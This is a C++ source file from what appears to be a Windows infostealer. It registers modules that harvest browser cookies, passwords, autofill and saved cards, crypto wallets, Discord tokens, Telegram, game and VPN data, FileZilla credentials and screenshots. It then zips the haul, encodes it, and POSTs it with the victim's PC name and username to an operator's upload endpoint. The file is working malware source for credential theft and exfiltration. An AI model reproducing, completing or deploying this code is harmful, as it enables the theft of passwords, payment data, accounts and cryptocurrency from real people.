//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "miniz.h"
#include "impl/Screenshot.h"
#include "impl/Info.h"
#include "impl/messengers/Messengers.h"
#include "impl/files/Files.h"
#include "impl/Processes.h"
#include "impl/crypto/Crypto.h"
#include "impl/vpns/VPNs.h"
#include "impl/games/Games.h"
#include "impl/InstalledApps.h"
#include "impl/FileZilla.h"
#include "impl/browsers/chromium/ChromiumBrowsers.h"
#include "impl/browsers/firefox/FirefoxBrowsers.h"
#include "../Config.h"
#include "../Counter.h"

void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
    this->modules.push_back(new Messengers());
    this->modules.push_back(new Crypto());
    this->modules.push_back(new VPNs());
    this->modules.push_back(new Games());
    this->modules.push_back(new Files());
    this->modules.push_back(new Info());
    this->modules.push_back(new Processes());
    this->modules.push_back(new InstalledApps());
    this->modules.push_back(new FileZilla());
    this->modules.push_back(new ChromiumBrowsers());
    this->modules.push_back(new FirefoxBrowsers());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#ifdef DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    StealerModuleGroup::execute(this->root_dir);
}

void Stealer::complete() {
#ifndef DEV
#ifdef BUILD_UUID
#ifdef BUILD_SECRET
#ifdef UPLOAD_URL
    fs::path log = this->zip_log();
    fs::remove_all(this->root_dir);

    if(!exists(log))
        return;

    std::vector<unsigned char> fileBytes = FilesUtil::readBytesFromFile(log);
    if(fileBytes.empty())
        return;

    fs::remove(log);

    std::vector<unsigned char> bytes;

    std::string encoded = Base64Util::b64encodeKey(fileBytes, BUILD_SECRET);
    bytes.assign(encoded.begin(), encoded.end());
    encoded = Base64Util::b64encode(bytes);

    char acUserName[100];
    DWORD nUserName = sizeof(acUserName);

    char acPcName[100];
    DWORD nPcName = sizeof(acUserName);

    GetUserName(acUserName, &nUserName);
    GetComputerName(acPcName, &nPcName);

    json data = {
            {"log_file", bytes},
            {"pc_name", acPcName},
            {"pc_username", acUserName},
            {"os", OSUtil::getOsInfo()},
            {"auto_fills", Counter::getAutoFills()},
            {"bookmarks", Counter::getBookmarks()},
            {"cards", Counter::getCards()},
            {"cookies", Counter::getCookies()},
            {"crypto", Counter::getCrypto()},
            {"discord_tokens", Counter::getDiscordTokens()},
            {"downloads", Counter::getDownloads()},
            {"files", Counter::getFiles()},
            {"history", Counter::getHistory()},
            {"passwords", Counter::getPasswords()},
            {"battlenet", Counter::isBattlenet()},
            {"steam", Counter::isSteam()},
            {"ubisoft_connect", Counter::isUbisoftConnect()},
            {"minecraft", Counter::isMinecraft()},
            {"telegram", Counter::isTelegram()}
    };

    std::string host = UPLOAD_URL;
    HttpUtil::sentPostRequest(host + "/api/v2/uploads/log/" + BUILD_UUID, data);
#endif
#endif
#endif
#endif
}


void add_file_to_zip(mz_zip_archive& zip_archive, const fs::path& file_path, const fs::path& base_path) {
    std::string file_in_zip = fs::relative(file_path, base_path).string();
    mz_zip_writer_add_file(&zip_archive, file_in_zip.c_str(), file_path.string().c_str(), nullptr, 0, MZ_DEFAULT_COMPRESSION);
}

void add_folder_to_zip(mz_zip_archive& zip_archive, const fs::path& folder_path, const fs::path& base_path) {
    for (const auto& entry : fs::recursive_directory_iterator(folder_path)) {
        if (fs::is_regular_file(entry.path())) {
            add_file_to_zip(zip_archive, entry.path(), base_path);
        }
    }
}

void add_comment_to_zip(const std::string& archive_path, const std::string& comment) {
    std::fstream file(archive_path, std::ios::in | std::ios::out | std::ios::binary);
    if (!file) {
        return;
    }

    file.seekg(-22, std::ios::end);
    std::streampos end_of_central_dir = file.tellg();
    char buffer[22];
    file.read(buffer, 22);

    if (buffer[0] != 'P' || buffer[1] != 'K' || buffer[2] != 5 || buffer[3] != 6) {
        return;
    }

    auto comment_size = static_cast<int>(comment.size());
    buffer[20] = comment_size & 0xFF;
    buffer[21] = (comment_size >> 8) & 0xFF;

    file.seekp(end_of_central_dir);
    file.write(buffer, 22);
    file.write(comment.c_str(), comment.size());

    file.close();
}

fs::path Stealer::zip_log() {
    fs::path out_zip = Utils::getTemp() / Utils::generateString(20);
    std::ofstream f(out_zip);
    f.close();

    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));
    if (!mz_zip_writer_init_file(&zip_archive, out_zip.string().c_str(), 0)) {
        return "";
    }

    add_folder_to_zip(zip_archive, this->root_dir, this->root_dir);

    std::stringstream comment;

    comment << R"(                                                                        ▄)" << "\n";
    comment << R"(   ▄▄▄████████████         ╓▄r  ▄▄    ,▄▄▄███▄,                       ▄███)" << "\n";
    comment << R"(   -  ███▀                ██▀  ██▀▄▄████▀▀▀▀▀▀█▄                    ╔███▀)" << "\n";
    comment << R"(    ╓███▀           ,   ▄██▀ ▄███████▌    ,▄████                   ▄███)" << "\n";
    comment << R"(   ▄███▀       ▄█▄ ██  ███- ███▀ ▄███ ,▄▄███▀▀█  ,▄█⌐ ▄▄▄,   ▄▄█▄▄▄███)" << "\n";
    comment << R"(  ▄████▄▄    ▄██████` ███  ███  ▄███▄████▀  ,   ▄██▀▄█████ ▄███▀▐████)" << "\n";
    comment << R"(███████▀▀▀  ███▀███▌ ███ ,███  ▐███████▄   ▄██ ▄████▀ ██▀ ███▀ ▄████)" << "\n";
    comment << R"( ████      ▐████▀██ ███  ███   ███▀    ▄█▌╒██`j███▀   █▀ ███ ▄█████)" << "\n";
    comment << R"( ███        ███`▐█ j██` ▐██   ▐██▀   ▄███ ▐█▌ ███`       █████- ██▌)" << "\n";
    comment << R"(███`            ╙   ▀█▀` ▀█▀  ▐█▌,▄████▀   ▀   ▀          ▀▀    ██)" << "\n";
    comment << R"(▀█▌                         ╓▄▄█████▀                            ')" << "\n";
    comment << R"(                             ▀▀▀        ▄▄███▀▄▄▄██w▄.      ▄▀)" << "\n";
    comment << R"(                                       ██▀     ▄█ ▄▄  ,▄▄█ █▀▄▄, ,▄,▄▄)" << "\n";
    comment << R"(                                        ▀▀▀▀▀▄ █ ███▌▐███╒█.████╒██▀█)" << "\n";
    comment << R"(                                     ▄█▀   ,▄▀▐▌ █▀▀ ▀█▐▀█▌ ▀▀▀ █▀)" << "\n";
    comment << R"(                                     ▀▀▀▀▀▀▀)" << "\n";
    comment << R"(    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)" << "\n";
    comment << R"(  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)" << "\n";
    comment << "       ╢█ ]█,        ╔════════════════╗" << "\n";
    comment << "       ╢█ ]█,        ║    BROWSERS    ║" << "\n";
    comment << "       ╢█ ]█,        ╚╦═══════════════╝" << "\n";
    comment << "       ╢█ ]█.         ╠═ Cookies: " << std::to_string(Counter::getCookies()) << "\n";
    comment << "     @▓╣█ }╙██@       ╠═ Passwords: " << std::to_string(Counter::getPasswords()) << "\n";
    comment << "     ▓╫▀▒▒▌▐╢µ╠█      ╠═ Auto fills: " << std::to_string(Counter::getAutoFills()) << "\n";
    comment << "    j╫█▓H╚▀╣╝▐▓█      ╠═ Cards: " << std::to_string(Counter::getCards()) << "\n";
    comment << "    j╫█¬     ╞╫█      ╠═ Bookmarks: " << std::to_string(Counter::getBookmarks()) << "\n";
    comment << "    j╫█¬     ╞╫█      ╠═ Downloads: " << std::to_string(Counter::getDownloads()) << "\n";
    comment << "    j╫█¬     ╞╫█      ╚═ History: " << std::to_string(Counter::getHistory()) << "\n";
    comment << "    j╫█¬     ╞╫█      \n";
    comment << "     ██╣╢█▓╣▓╣█      ╔════════════════╗" << "\n";
    comment << "     ╙▒▀╫█▌▐▀▓█      ║     GAMES      ║" << "\n";
    comment << "      ╙╢█ |▓▀▀       ╚╦═══════════════╝" << "\n";
    comment << "       ╢█ ╘▓          ╠═ Battle.net: " << (Counter::isBattlenet() ? "Yes" : "No") << "\n";
    comment << "       ╢█ ╘▓          ╠═ Ubisoft: " << (Counter::isUbisoftConnect() ? "Yes" : "No") << "\n";
    comment << "       ╢█ ╘▓          ╠═ Minecraft: " << (Counter::isMinecraft() ? "Yes" : "No") << "\n";
    comment << "       ╢█ ╘▓          ╚═ Steam: " << (Counter::isSteam() ? "Yes" : "No") << "\n";
    comment << "     @▓╣█ }╙██@       \n";
    comment << "     ▓╫▀▒▒▌▐╢µ╠█     ╔════════════════╗" << "\n";
    comment << "    j╫█▓H╚▀╣╝▐▓█     ║   MESSENGERS   ║" << "\n";
    comment << "    j╫█¬     ╞╫█     ╚╦═══════════════╝" << "\n";
    comment << "    j╫█¬     ╞╫█      ╠═ Telegram: " << (Counter::isTelegram() ? "Yes" : "No") << "\n";
    comment << "    j╫█¬     ╞╫█      ╚═ Discord tokens: " << std::to_string(Counter::getDiscordTokens()) << "\n";
    comment << "     ██╣╢█▓╣▓╣█        \n";
    comment << "     ╙▒▀╫█▌▐▀▓█      ╔════════════════╗" << "\n";
    comment << "      ╙╢█ |▓▀▀       ║     OTHER      ║" << "\n";
    comment << "       ╢█ ╘▓         ╚╦═══════════════╝" << "\n";
    comment << "       ╢█ ╘▓          ╚═ Files grabbed: " << std::to_string(Counter::getFiles()) << "\n";

    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
        mz_zip_writer_end(&zip_archive);
        return "";
    }

    mz_zip_writer_end(&zip_archive);
    add_comment_to_zip(out_zip.string(), comment.str());

    return out_zip;
}
